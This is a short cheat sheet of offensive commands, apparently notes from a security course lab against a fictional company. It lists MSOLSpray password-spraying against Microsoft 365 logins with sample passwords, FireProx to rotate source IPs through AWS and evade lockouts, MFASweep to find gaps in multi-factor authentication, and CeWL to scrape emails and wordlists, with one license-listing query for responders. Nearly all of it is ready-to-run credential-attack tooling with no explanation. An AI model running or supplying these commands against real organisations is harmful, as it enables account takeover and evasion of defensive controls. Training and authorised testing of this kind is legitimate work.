# MSOLSpray
import-module /opt/msolspray/msolpray.ps1 
invoke-msolspray -userlist users.txt -password Clippers22
## API FireProx
python fire.py --command create --region us-east-1 --url https://login.microsoft.com 
pwsh 
import-module /opt/msolspray/msolpray.ps1 
invoke-msolspray -userlist users.txt -URL https://7t4123123.execute-api us-east-1.amazonaws.com/fireprox/ Falismentis123 
## MSOL IR Identification
get-msoluser -all | where {$_.islicensed -eq $true}| Select displayname, @{n="License ID";e={$_.licenses.accountskuid}}

# MFA Bypass
invoke-mfasweep -username james@sans.org -password cyberus2022 

## CeWL for emails
/opt/cewl/cewl.rb -d 8 -w words.txt -e --email_file email.txt http://www.falsimentis.com/